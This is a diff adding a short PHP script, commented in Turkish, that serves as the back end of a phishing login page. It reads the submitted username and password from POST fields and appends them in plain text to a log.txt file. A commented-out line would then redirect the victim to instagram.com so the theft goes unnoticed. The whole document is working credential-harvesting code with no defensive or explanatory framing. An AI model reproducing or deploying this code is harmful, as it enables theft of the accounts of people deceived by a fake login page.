@@ -1,0 +1,13 @@
+<?php 
+@$ad=$_POST["kullaniciadi"];
+@$sifre=$_POST["sifre"];
+if($_POST){
+
+$yaz=fopen("log.txt","a");
+$icerik="Kullanıcı adı :".$ad." şifre :".$sifre."\n";
+fwrite($yaz,$icerik);
+ 
+fclose($yaz);
+//	header("location:http://www.instagram.com");
+}
+?>
